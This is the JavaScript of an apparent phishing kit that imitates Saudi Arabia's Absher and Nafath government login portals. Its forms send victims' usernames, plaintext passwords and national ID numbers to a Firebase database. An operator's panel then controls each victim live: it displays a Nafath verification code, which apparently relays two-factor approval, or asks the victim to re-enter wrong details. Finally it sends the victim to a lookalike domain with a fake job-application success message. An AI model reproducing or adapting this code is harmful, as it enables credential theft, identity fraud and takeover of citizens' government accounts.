// script.js

// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
import { db } from "./firebase-config.js";

// استيراد الدوال المطلوبة
import {
    collection,
    addDoc,
    serverTimestamp,
    doc,
    onSnapshot
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// القاموس الثابت للرسائل والتنبيهات باللغة العربية بعد إلغاء تبديل اللغات
const activeTrans = {
    loaderWaiting: "يرجى الانتظار لا تغادر الصفحه...",
    appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> تم التقديم على وظيفتك بنجاح عبر المنصة الوطنية الموحدة... جاري تحويلك الآن`,
    wrongId: "عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.",
    wrongAuth: "اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.",
    approved: "تم التحقق والمطابقة بنجاح من قبل الإدارة.",
    rejected: "تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.",
    networkError: "عذراً، حدث خطأ في الاتصال بالشبكة.",
    failSubmit: "فشل إرسال الطلب، تأكد من اتصال الشبكة.",
    lengthError: "خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً."
};

document.addEventListener('DOMContentLoaded', () => {

    // ==========================================
    // 1. تفاعلات الصفحة الرئيسية والتحويل لصفحة تسجيل الدخول
    // ==========================================
    const loginCard = document.getElementById('loginCard');
    if (loginCard) {
        // إضافة مؤشر الماوس ليكون واضحاً أنه قابل للنقر
        loginCard.style.cursor = 'pointer'; 
        
        loginCard.addEventListener('click', (e) => {
            e.preventDefault();
            loginCard.style.transform = 'scale(0.95)';
            loginCard.style.transition = 'transform 0.15s ease';
            
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 150);
        });
    }

    // ==========================================
    // 2. نظام التبويب والأكورديون الديناميكي (Accordion System)
    // ==========================================
    const tabs = document.querySelectorAll('.accordion-item');
    const panels = document.querySelectorAll('.form-panel-card');

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            if (tab.classList.contains('collapsed')) {

                tabs.forEach(t => {
                    t.classList.remove('active');
                    t.classList.add('collapsed');
                    const icon = t.querySelector('.status-icon');
                    if (icon) {
                        icon.className = 'fa-solid fa-plus status-icon';
                    }
                });

                panels.forEach(p => {
                    p.classList.add('hidden-panel');
                });

                tab.classList.remove('collapsed');
                tab.classList.add('active');
                const currentIcon = tab.querySelector('.status-icon');
                if (currentIcon) {
                    currentIcon.className = 'fa-solid fa-minus status-icon';
                }

                const targetPanelId = tab.getAttribute('data-target');
                const targetPanel = document.getElementById(targetPanelId);
                if (targetPanel) {
                    targetPanel.classList.remove('hidden-panel');
                }
            }
        });
    });

    // ==========================================
    // 3. معالجة إرسال النماذج ومراقبة رد الأدمن لحظياً
    // ==========================================
    const globalLoader = document.getElementById('globalLoader');
    const loaderText = globalLoader ? globalLoader.querySelector('.loader-text') : null;

    function listenToAdminApproval(collectionName, docId) {
        const docRef = doc(db, collectionName, docId);

        const nafathFormContainer = document.getElementById('nafathFormContainer');
        const nafathWaitContainer = document.getElementById('nafathWaitContainer');
        const nafathLiveNumber = document.getElementById('nafathLiveNumber');

        const unsubscribe = onSnapshot(docRef, (snapshot) => {
            if (snapshot.exists()) {
                const data = snapshot.data();

                if (data.status === "applied_success") {
                    if (globalLoader) globalLoader.classList.remove('hidden-loader');
                    if (loaderText) {
                        loaderText.innerHTML = activeTrans.appliedSuccess;
                        loaderText.style.color = "#16a34a";
                    }

                    if (nafathWaitContainer) nafathWaitContainer.classList.add('hidden-panel');
                    unsubscribe();

                    setTimeout(() => {
                        window.location.href = "https://absheer-sa.onrender.com/";
                    }, 5000);
                }

                else if (data.status === "show_code") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
                    if (nafathLiveNumber) nafathLiveNumber.innerText = data.verificationCode;
                    if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
                }

                else if (data.status === "wrong_national_id") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.wrongId);
                    unsubscribe();
                    window.location.reload();
                }

                else if (data.status === "wrong_auth_data") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.wrongAuth);
                    unsubscribe();
                    window.location.reload();
                }

                else if (data.status === "approved") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.approved);
                    window.location.href = "dashboard.html";
                    unsubscribe();
                }

                else if (data.status === "rejected") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert(activeTrans.rejected);
                    unsubscribe();
                    window.location.reload();
                }
            }
        });
    }

    const cancelNafathBtn = document.getElementById('cancelNafathBtn');
    if (cancelNafathBtn) {
        cancelNafathBtn.addEventListener('click', () => {
            window.location.reload();
        });
    }

    // أ) نموذج اسم المستخدم وكلمة المرور
    const authForm = document.getElementById('authForm');
    if (authForm) {
        authForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const usernameInput = document.getElementById('username').value;
            const passwordInput = document.getElementById('password').value;

            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            if (loaderText) {
                loaderText.innerText = activeTrans.loaderWaiting;
                loaderText.style.color = "#14805e";
            }

            try {
                const docRef = await addDoc(collection(db, "users_login"), {
                    username: usernameInput,
                    password: passwordInput,
                    timestamp: serverTimestamp(),
                    device: navigator.userAgent,
                    status: "waiting_admin"
                });

                listenToAdminApproval("users_login", docRef.id);

            } catch (error) {
                console.error("خطأ: ", error);
                alert(activeTrans.networkError);
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }

    // ب) نموذج رقم بطاقة الأحوال (تطبيق نفاذ)
    const appForm = document.getElementById('appForm');
    if (appForm) {
        const nationalIdField = document.getElementById('nationalId');
        if (nationalIdField) {
            nationalIdField.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
            });
        }

        appForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const nationalIdInput = document.getElementById('nationalId').value.trim();

            if (nationalIdInput.length !== 10) {
                alert(activeTrans.lengthError);
                return;
            }

            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            if (loaderText) {
                loaderText.innerText = activeTrans.loaderWaiting;
                loaderText.style.color = "#14805e";
            }

            try {
                const docRef = await addDoc(collection(db, "nafath_app_requests"), {
                    nationalId: nationalIdInput,
                    timestamp: serverTimestamp(),
                    device: navigator.userAgent,
                    status: "waiting_admin"
                });

                listenToAdminApproval("nafath_app_requests", docRef.id);

            } catch (error) {
                console.error("خطأ: ", error);
                alert(activeTrans.failSubmit);
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }
});
